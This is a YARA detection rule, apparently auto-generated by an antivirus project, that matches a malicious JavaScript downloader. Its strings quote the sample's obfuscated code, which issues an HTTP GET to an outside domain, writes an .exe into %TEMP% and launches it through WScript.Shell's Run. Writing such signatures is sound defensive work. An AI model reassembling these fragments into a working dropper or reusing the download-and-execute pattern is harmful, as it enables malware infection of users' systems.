rule sig_20160329_2febaf8444f2102a60b41beb973d23a4 {
  meta:
    description = "datamaliciousorder - file 20160329_2febaf8444f2102a60b41beb973d23a4.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "147301fd94bc0719dc344f69584a0b8cbfba871fc4ae4386a97c06ebc0395d3f"

  strings:
    $s1  = "Sk[My](\"GET\", \"http://refindsexy.com/i8eps\", false);" fullword ascii
    $s2  = "function Xy() {return et[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"pGAmDPTywMKT.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[BN](D() * 11); if (Sk[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "var et = function s() {return WScript[k](\"WScript.Shell\");}(), zk = 11;" fullword ascii
    $s5  = "function Ha(C, yJ){uc = uc * 1; return C - yJ;};" fullword ascii
    $s6  = "function R(){return \"\" + J;};" fullword ascii
    $s7  = "function Kk(A){et[\"Run\"](A, uc, uc);};" fullword ascii
    $s8  = "function n() {return ((f == true) && (f == rh)) ? 1 : uc;};" fullword ascii
    $s9  = "var B = new this[\"Date\"]();" fullword ascii
    $s10 = "function ul()" fullword ascii
    $s11 = "function W(DP) {var u = (1, 2, 3, 4, 5, DP); return u;};" fullword ascii
    $s12 = "function sz(){return k;};" fullword ascii
    $s13 = "function D(){return 22;};" fullword ascii
    $s14 = "return Ha(m, q);" fullword ascii
    $s15 = " while (tn){" fullword ascii
    $s16 = "var f = false;" fullword ascii
    $s17 = "f = true; " fullword ascii
    $s18 = "var rh = false;" fullword ascii
    $s19 = "var Rw = false;" fullword ascii
    $s20 = "rh = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}